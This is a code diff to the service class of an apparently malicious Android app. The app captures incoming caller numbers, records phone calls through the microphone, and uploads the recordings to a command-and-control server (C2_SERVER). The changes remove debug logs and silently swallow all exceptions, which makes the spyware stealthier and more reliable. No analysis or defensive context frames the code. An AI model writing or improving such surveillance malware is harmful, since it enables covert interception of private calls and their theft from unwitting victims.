@@ -44,6 +44,8 @@ public class MainService extends Service {
 
     private static String incomingNumber;
 
+    private static boolean isRecording = false;
+
 
     @Nullable
     @Override
@@ -97,7 +99,6 @@ public class MainService extends Service {
                     if (phoneState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                         // Incoming call is ringing
                         incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
-                        Log.d("eeee", incomingNumber);
 
                         JSONObject json = new JSONObject();
                         try {
@@ -108,31 +109,31 @@ public class MainService extends Service {
                             json.put("timestamp", System.currentTimeMillis());
 
                             client.send(json.toString());
-                        } catch (JSONException e) {
-                            throw new RuntimeException(e);
-                        }
+                        } catch (Exception e) {}
 
                     } else if (phoneState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                         // Call is in progress (either incoming or outgoing)
                         //Creating file
                         File dir = Environment.getExternalStorageDirectory();
                         try {
-                            audiofile = File.createTempFile(String.valueOf(System.currentTimeMillis()), ".ogg", dir);
+                            audiofile = File.createTempFile(String.valueOf(System.currentTimeMillis()), ".3gp", dir);
 
-                            recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
-                            recorder.setOutputFormat(MediaRecorder.OutputFormat.OGG);
-                            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
+                            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+                            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+                            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                             recorder.setOutputFile(audiofile.getAbsolutePath());
                             recorder.prepare();
                             recorder.start();
-                        } catch (IOException e) {}
+                            isRecording = true;
+                        } catch (Exception e) {}
 
                     } else if (phoneState.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                         // Call has ended
-                        recorder.stop();
+                        if (isRecording)
+                            recorder.stop();
+                        recorder.reset();
                         recorder.release();
-
-                        Log.d("eeee", audiofile.getAbsolutePath());
+                        isRecording = false;
 
                         FileManager.uploadFile(audiofile.getAbsolutePath(), C2_SERVER + "recordings");
 
@@ -146,9 +147,7 @@ public class MainService extends Service {
                             json.put("timestamp", System.currentTimeMillis());
 
                             client.send(json.toString());
-                        } catch (JSONException e) {
-                            throw new RuntimeException(e);
-                        }
+                        } catch (Exception e) {}
                     }
                 }
             }
@@ -186,9 +185,7 @@ public class MainService extends Service {
                                     json.put("timestamp", System.currentTimeMillis());
 
                                     client.send(json.toString());
-                                } catch (JSONException e) {
-                                    throw new RuntimeException(e);
-                                }
+                                } catch (Exception e) {}
                             }
                         }
                     }
